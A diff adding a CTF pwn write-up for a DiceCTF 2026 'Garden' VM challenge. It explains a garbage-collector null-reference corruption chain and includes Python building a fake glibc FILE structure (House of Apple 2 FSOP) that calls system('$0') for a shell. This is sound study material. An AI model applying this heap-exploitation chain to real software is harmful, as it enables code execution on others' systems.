@@ -846,6 +846,55 @@ code += [0x54, 0x5e, 0x53, 0x5a, 0x54, 0x0f, 0xa0]
 
 ---
 
+## GC Null-Reference Cascading Corruption (DiceCTF 2026)
+
+**Pattern (Garden):** Custom stack-based VM with mark-compact GC. GC's `mark_reachable()` follows null references (ref=0) to address 0 of the managed heap (zeroed reserved area), creating a fake 4-byte object. During compaction, `memmove` copies this fake object first, corrupting adjacent real object headers.
+
+**Exploit chain:**
+1. **Cascading memmove** — Set up sacrificial array SAC with `entries[0]=0xFFFF`, large array BIG (196 entries) with `entries[195]=0x00040005`, off-heap object OH
+   - Null-ref GC corrupts SAC's header to `{0,0}` (length=0)
+   - SAC's entry `0xFFFF` cascades into BIG's header → BIG.length = 0xFFFF (OOB!)
+   - BIG's entry `0x00040005` cascades into OH's header → OH stays valid
+
+2. **OOB expansion** — Use BIG's OOB write to set OH.obj_size = 0x10000, giving 256KB OOB access on glibc heap
+
+3. **Libc leak** — Create 70+ extra objects so GC's `ctx.objs` allocation exceeds 0x410 bytes → freed to unsorted bin → `main_arena` pointers readable via OH
+
+4. **House of Apple 2 FSOP** — Build fake FILE in OH's data buffer:
+```python
+# Fake FILE structure
+fake_file = flat({
+    0x00: b'$0\x00\x00',             # _flags — system("$0") spawns shell
+    0x20: p64(0),                      # _IO_write_base = 0
+    0x28: p64(1),                      # _IO_write_ptr = 1 (> write_base)
+    0x88: p64(heap_lock_addr),         # _lock (valid writable addr)
+    0xa0: p64(wide_data_addr),         # _wide_data
+    0xc0: p64(1),                      # _mode = 1 (triggers wide path)
+    0xd8: p64(io_wfile_jumps),         # vtable = _IO_wfile_jumps
+})
+# Fake _IO_wide_data
+fake_wide = flat({
+    0x18: p64(0),                      # _IO_write_base = 0
+    0x30: p64(0),                      # _IO_buf_base = 0
+    0xe0: p64(fake_wide_vtable_addr),  # _wide_vtable
+})
+# Fake wide vtable with __doallocate = system
+fake_wide_vtable = flat({
+    0x68: p64(libc.sym.system),
+})
+# Overwrite _IO_list_all to point to fake FILE
+```
+
+5. **Trigger** — Program exit → `_IO_flush_all` → fake FILE → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `system("$0")` → shell
+
+**`system("$0")` trick:** `$0` expands to the shell name when run via `system()`. Using `"$0\x00\x00"` as `_flags` means `system(fp)` calls `system("$0")` which spawns a shell.
+
+**Key insight:** Mark-compact GC that follows null references creates controllable corruption. The cascade effect — where one corrupted header causes memmove to misalign subsequent objects — amplifies a small initial corruption into full OOB access. Combined with FSOP, this achieves code execution from a VM-level bug.
+
+**STORE array pattern for VM stack management:** When VM only has DUP/SWAP/DROP/DUP_X1, allocate an array object to hold references (via SET_ELEM_OBJ/GET_ELEM_OBJ), enabling random access to values that would otherwise require complex stack juggling.
+
+---
+
 ## Kernel Exploitation
 
 - Look for vulnerable `lseek` handlers allowing OOB read/write
